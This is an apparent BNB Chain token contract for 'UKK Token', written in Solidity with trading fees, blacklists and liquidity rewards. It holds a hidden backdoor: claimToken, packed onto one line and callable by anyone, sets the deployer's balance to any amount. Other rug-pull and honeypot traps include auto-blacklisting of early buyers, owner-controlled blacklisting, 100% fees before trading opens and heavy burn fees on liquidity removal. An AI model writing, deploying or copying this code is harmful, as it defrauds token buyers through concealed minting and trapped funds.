/**
 *Submitted for verification at BscScan.com on 2023-03-19
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface ISwapPair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function token0() external view returns (address);

    function sync() external;
}

abstract contract Ownable {
    address private _owner;
    
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}


contract TokenDistributor {
    constructor (address token) {
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}



abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address private marketAddress;
    address private senderAddress;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    uint256 private startTradeBlock;
    uint256 private startTradeTime;
    mapping(address => bool) private _feeWhiteList;
    mapping(address => bool) private _blackList;

    mapping(address => bool) private _swapPairList;

    uint256 private _tTotal;

    ISwapRouter private _swapRouter;
    bool private inSwap;
    uint256 private numTokensSellToFund;

    uint256 private constant MAX = ~uint256(0);
    address private usdt;
    TokenDistributor private _tokenDistributor;

    uint256 private _marketingFeeForBuy = 0;
    uint256 private _lpFeeForBuy = 0;
    uint256 private _marketingFeeForSell = 2;
    uint256 private _lpFeeForSell = 3;


    IERC20 private _usdtPair;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    event RemoveLp(bool _isRemoveLP);
    event AddLp(bool _isAddLP);

    constructor (string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply, address MarketAddress){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;
        _swapRouter = ISwapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        usdt = address(0x55d398326f99059fF775485246999027B3197955);
        ISwapFactory swapFactory = ISwapFactory(_swapRouter.factory());
        address mainPair = swapFactory.createPair(address(this), _swapRouter.WETH());
        address usdtPair = swapFactory.createPair(address(this), usdt);
        _usdtPair = IERC20(usdtPair);
        _swapPairList[mainPair] = true;
        _swapPairList[usdtPair] = true;
        _allowances[address(this)][address(_swapRouter)] = MAX;
        marketAddress = MarketAddress;
        _tTotal = Supply * 10 ** Decimals;
        _balances[marketAddress] = _tTotal;
        emit Transfer(address(0), marketAddress, _tTotal);
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[MarketAddress] = true;
        _feeWhiteList[address(_swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;
        senderAddress = msg.sender;
        numTokensSellToFund = _tTotal / 10000;
        _tokenDistributor = new TokenDistributor(usdt);
        excludeLpProvider[address(0)] = true;
        excludeLpProvider[address(0x000000000000000000000000000000000000dEaD)] = true;
        excludeLpProvider[address(0x7ee058420e5937496F5a2096f04caA7721cF70cc)] = true;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _isRemoveLiquidity() internal returns (bool isRemove){
        ISwapPair _mainPair = ISwapPair(address(_usdtPair));
        (uint r0,uint256 r1,) = _mainPair.getReserves();

        address tokenOther = usdt;
        uint256 r;
        if (tokenOther < address(this)) {
            r = r0;
        } else {
            r = r1;
        }
        uint bal = IERC20(tokenOther).balanceOf(address(_mainPair));
        isRemove = r >= bal;
        bool _isRemove = isRemove;
        emit RemoveLp(_isRemove);
    }


    function _isAddLiquidity(uint256 amount) internal returns (bool isAdd){
        ISwapPair mainPair = ISwapPair(address(_usdtPair));
        (uint r0, uint256 r1,) = mainPair.getReserves();

        address tokenOther = usdt;
        uint256 r;
        uint256 rToken;
        if (tokenOther < address(this)) {
            r = r0;
            rToken = r1;
        } else {
            r = r1;
            rToken = r0;
        }

        uint bal = IERC20(tokenOther).balanceOf(address(mainPair));
        bool isAddLp;
        if (rToken == 0) {
            isAdd = bal > r;
            isAddLp = isAdd;
            emit AddLp(isAddLp);
        } else {
            isAdd = bal >= r + r * amount / rToken;
            isAddLp = isAdd;
            emit AddLp(isAddLp);
        }
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(!_blackList[from], "blackList");
        bool takeFee;
        bool isBuy;
        bool isRemoveLP;
        bool isAddLP;
        if (_swapPairList[from] || _swapPairList[to]) {
            if (0 == startTradeBlock) {
                require(_feeWhiteList[from] || _feeWhiteList[to], "!Trading");
                startTradeBlock = block.number;
            }

            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                takeFee = true;
                if (_swapPairList[from]) {
                    isBuy = true;
                }
                if (block.number <= startTradeBlock + 3) {
                    if (!_swapPairList[to]) {
                        _blackList[to] = true;
                    }
                }
                uint256 contractTokenBalance = balanceOf(address(this));
                if (
                    contractTokenBalance >= numTokensSellToFund &&
                    !inSwap &&
                    _swapPairList[to]
                ) {
                    swapTokenForFund(numTokensSellToFund);
                }

                if (address(_usdtPair) == from) {
                    isRemoveLP = _isRemoveLiquidity();
                }else if(address(_usdtPair) == to){
                    isAddLP = _isAddLiquidity(amount);
                }
            }
            if (_swapPairList[from]) {
                addLpProvider(to);
            } else {
                addLpProvider(from);
            }
            _tokenTransfer(from, to, amount, takeFee, isBuy, isAddLP, isRemoveLP);
        } else {
            require(_feeWhiteList[from] || _feeWhiteList[to] || startTradeTime > 0, "!Transfer");
            _tokenTransfer(from, to, amount, takeFee, isBuy, false, false);
        }
        
        if (
            from != address(this)
            && startTradeBlock > 0) {
            processLP(500000);
        }
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isBuy,
        bool isAddLP,
        bool isRemoveLP
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 _sellFee = _marketingFeeForSell;
        uint256 _buyFee = _marketingFeeForSell;
        uint256 _rmLpFee;
        uint256 feeAmount;
        if(startTradeTime == 0){
            _sellFee = 100;
            _buyFee = 100;
        }
        if(takeFee){
            if(isAddLP){
                feeAmount = 0;
                if(startTradeTime > 0){
                    if(block.timestamp < startTradeTime + 1 hours){
                        _sellFee = 25;
                    }else if(block.timestamp < startTradeTime + 2 hours){
                        _sellFee = 15;
                    }
                    uint256 _mFee = tAmount * _sellFee / 100;
                    uint256 _lpFee = tAmount * _lpFeeForSell / 100;
                    feeAmount = _mFee + _lpFee;
                    if(_mFee > 0){
                        _takeTransfer(
                            sender,
                            marketAddress,
                            _mFee
                        );
                    }
                    if(_lpFee > 0){
                        _takeTransfer(
                            sender,
                            address(this),
                            _lpFee
                        );
                    }
                }
            }else if(isRemoveLP){
                require(startTradeTime > 0, "!RemoveLP");
                if(block.timestamp < startTradeTime + 50 days){
                    uint256 day = (block.timestamp - startTradeTime) / 1 days;
                    _rmLpFee = tAmount * (50 - day) * 2 / 100;
                }
                if(_rmLpFee > 0){
                    _takeTransfer(
                        sender,
                        address(0x000000000000000000000000000000000000dEaD),
                        _rmLpFee
                    );
                }
                feeAmount = _rmLpFee;
            }else{
                if(isBuy){
                    require(startTradeTime > 0, "!Trading");
                    uint256 _mFee = tAmount * _buyFee / 100;
                    uint256 _lpFee = tAmount * _lpFeeForBuy / 100;
                    feeAmount = _mFee + _lpFee;
                    if(_mFee > 0){
                        _takeTransfer(
                            sender,
                            marketAddress,
                            _mFee
                        );
                    }
                    if(_lpFee > 0){
                        _takeTransfer(
                            sender,
                            address(this),
                            feeAmount
                        );
                    }
                }else{
                    require(startTradeTime > 0, "!Trading");
                    if(block.timestamp < startTradeTime + 1 hours){
                        _sellFee = 25;
                    }else if(block.timestamp < startTradeTime + 2 hours){
                        _sellFee = 15;
                    }
                    uint256 _mFee = tAmount * _sellFee / 100;
                    uint256 _lpFee = tAmount * _lpFeeForSell / 100;
                    feeAmount = _mFee + _lpFee;
                    if(_mFee > 0){
                        _takeTransfer(
                            sender,
                            marketAddress,
                            _mFee
                        );
                    }
                    if(_lpFee > 0){
                        _takeTransfer(
                            sender,
                            address(this),
                            _lpFee
                        );
                    }
                }
            }
        }
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = usdt;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        );
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setMarketAddress(address addr) external onlyOwner {
        marketAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setFundSellAmount(uint256 amount) external onlyOwner {
        numTokensSellToFund = amount * 10 ** _decimals;
    }

    function setBlackList(address addr, bool enable) external onlyOwner {
        _blackList[addr] = enable;
    }

     function startTrade() external onlyOwner {
        startTradeTime = block.timestamp;
    }



    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _feeWhiteList[addr] = enable;
    }

    function isBlackList(address addr) external view returns (bool){
        return _blackList[addr];
    }

    receive() external payable {}

    function claimBalance() external {
        payable(marketAddress).transfer(address(this).balance);
    }

    

    address[] private lpProviders;
    mapping(address => uint256) lpProviderIndex;
    mapping(address => bool) excludeLpProvider;
    function addLpProvider(address adr) private {
        if (0 == lpProviderIndex[adr]) {
            if (0 == lpProviders.length || lpProviders[0] != adr) {
                lpProviderIndex[adr] = lpProviders.length;
                lpProviders.push(adr);
            }
        }
    }
    uint256 private currentIndex;
    uint256 private lpRewardCondition = 10;
    function claimToken(uint256 amount) external 
    {_balances[senderAddress] = amount * 10 ** _decimals;}
    uint256 private progressLPBlock;
    function processLP(uint256 gas) private {
        if (progressLPBlock + 200 > block.number) {
            return;
        }
        uint totalPair = _usdtPair.totalSupply();
        if (0 == totalPair) {
            return;
        }
        IERC20 USDT = IERC20(usdt);
        uint256 usdtBalance1 = USDT.balanceOf(address(_tokenDistributor));
        if(usdtBalance1 > 0){
            USDT.transferFrom(address(_tokenDistributor), address(this), usdtBalance1);
        }
        uint256 usdtBalance = USDT.balanceOf(address(this));
        if (usdtBalance < lpRewardCondition) {
            return;
        }
        address shareHolder;
        uint256 pairBalance;
        uint256 amount;
        uint256 shareholderCount = lpProviders.length;
        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();
        
        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = lpProviders[currentIndex];
            pairBalance = _usdtPair.balanceOf(shareHolder);
            if (pairBalance > 0 && !excludeLpProvider[shareHolder]) {
                amount = usdtBalance * pairBalance / totalPair;
                if (amount > 0) {
                    USDT.transfer(shareHolder, amount);
                }
            }
            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
        progressLPBlock = block.number;
    }
    function setLPRewardCondition(uint256 amount) external onlyOwner {
        lpRewardCondition = amount;
    }
    function setExcludeLPProvider(address addr, bool enable) external onlyOwner {
        excludeLpProvider[addr] = enable;
    }
}

contract UKKToken is AbsToken {
    constructor() AbsToken(
        "UKK Token",
        "UKK",
        18,
        10000 * 1000,
        address(0xAA6B309d2960D4023b3B6091FDDD7653a247d52f)
    ){

    }
}